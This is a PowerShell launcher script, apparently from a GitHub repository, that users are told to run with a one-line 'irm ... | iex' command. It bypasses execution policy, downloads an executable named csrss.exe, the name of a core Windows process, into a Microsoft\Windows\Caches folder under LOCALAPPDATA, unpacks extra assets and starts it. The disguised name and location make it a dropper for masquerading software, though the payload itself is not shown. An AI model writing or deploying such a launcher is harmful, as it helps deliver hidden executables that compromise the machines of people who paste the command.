# =============================================================================
# ARX / CURADO — single launcher (GitHub iex)
# =============================================================================
# 1) Edit $ExeUrl / $AssetsUrl below (replace OWNER/REPO)
# 2) Upload this file as:  network.ps1  on branch main (raw)
# 3) Publish release assets:  csrss.exe  +  assets.zip
# 4) Users run ONE command in PowerShell:
#
#    irm https://raw.githubusercontent.com/OWNER/REPO/main/network.ps1 | iex
#
# Optional override before iex:
#    $ExeUrl = 'https://.../csrss.exe'; irm ... | iex
# =============================================================================

try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -EA SilentlyContinue
} catch {}

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG (edit before publish) ---
if (-not $ExeUrl) {
    $ExeUrl = 'https://github.com/OWNER/REPO/releases/latest/download/csrss.exe'
}
if (-not $AssetsUrl) {
    $AssetsUrl = 'https://github.com/OWNER/REPO/releases/latest/download/assets.zip'
}

function Write-Arx([string]$msg, [string]$color = 'Cyan') {
    if ($Host.Name -eq 'ConsoleHost') {
        Write-Host $msg -ForegroundColor $color
    }
}

function Get-ArxDir {
    $dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Caches'
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    return $dir
}

function Get-ArxExe {
    return (Join-Path (Get-ArxDir) 'csrss.exe')
}

function Download-File([string]$url, [string]$outPath) {
    $tmp = "$outPath.download"
    Remove-Item -LiteralPath $tmp -Force -EA SilentlyContinue
    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing
    if (-not (Test-Path -LiteralPath $tmp) -or ((Get-Item -LiteralPath $tmp).Length -le 1024)) {
        Remove-Item -LiteralPath $tmp -Force -EA SilentlyContinue
        throw "Download failed or file too small: $url"
    }
    if (Test-Path -LiteralPath $outPath) {
        Remove-Item -LiteralPath $outPath -Force -EA SilentlyContinue
    }
    Move-Item -LiteralPath $tmp -Destination $outPath -Force
}

function Install-ArxAssets([string]$exeDir) {
    if (-not $AssetsUrl -or ($AssetsUrl -match 'OWNER/REPO')) {
        return $false
    }
    $zip = Join-Path $exeDir 'assets.zip.download'
    $extract = Join-Path $exeDir 'assets_extract'
    $dest = Join-Path $exeDir 'assets'
    try {
        Write-Arx 'Downloading assets...'
        Invoke-WebRequest -Uri $AssetsUrl -OutFile $zip -UseBasicParsing
        if (-not (Test-Path -LiteralPath $zip) -or ((Get-Item $zip).Length -le 64)) {
            return $false
        }
        if (Test-Path $extract) { Remove-Item $extract -Recurse -Force -EA 0 }
        Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force
        if (Test-Path $dest) { Remove-Item $dest -Recurse -Force -EA 0 }
        $inner = Join-Path $extract 'assets'
        if (Test-Path $inner) {
            Copy-Item -LiteralPath $inner -Destination $dest -Recurse -Force
        } else {
            New-Item -ItemType Directory -Force -Path $dest | Out-Null
            Copy-Item -Path (Join-Path $extract '*') -Destination $dest -Recurse -Force
        }
        return $true
    } catch {
        Write-Arx ("Assets skipped: " + $_.Exception.Message) 'Yellow'
        return $false
    } finally {
        Remove-Item -LiteralPath $zip -Force -EA SilentlyContinue
        Remove-Item -LiteralPath $extract -Recurse -Force -EA SilentlyContinue
    }
}

try {
    if ($ExeUrl -match 'OWNER/REPO') {
        throw @"
Edit CONFIG in network.ps1 first (replace OWNER/REPO), then upload to GitHub.
User command:
  irm https://raw.githubusercontent.com/OWNER/REPO/main/network.ps1 | iex
"@
    }

    $dir = Get-ArxDir
    $exe = Get-ArxExe

    Write-Arx 'Downloading csrss.exe...'
    Download-File $ExeUrl $exe
    Install-ArxAssets $dir | Out-Null

    Write-Arx ("Starting: $exe") 'Green'
    Start-Process -FilePath $exe
}
catch {
    Write-Arx $_.Exception.Message 'Red'
    exit 1
}
finally {
    Remove-Item -LiteralPath "$(Get-ArxExe).download" -Force -EA SilentlyContinue
}
